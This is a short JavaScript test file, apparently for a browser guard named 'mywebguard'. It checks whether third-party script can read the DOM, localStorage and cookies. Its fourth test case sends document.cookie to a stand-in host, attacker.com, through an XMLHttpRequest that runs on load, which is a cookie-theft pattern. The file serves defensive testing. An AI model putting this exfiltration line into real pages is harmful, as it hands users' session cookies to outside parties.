//test case 1: document.getElementById
document.getElementById("malicious");

//test case 2: localStorage.getItem

alert("Debug from https://mywebguard-thirdparty.github.io: localStorage.getItem('mywebguard')="+
      localStorage.getItem('mywebguard'));

//test case 3: document.cookie
if (document.cookie.indexOf("mywebguard")>0) {
  alert("Debug from https://mywebguard-thirdparty.github.io: document.cookie="+
      document.cookie);
}else
  document.cookie="mywebguard=mywebguard-cookie-test";


//test case 4: Ajax
function ajaxTest() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     //document.getElementById("demo").innerHTML = this.responseText;
	    alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://attacker.com/?cookie="+document.cookie, true);
  xhttp.send();
}
ajaxTest();
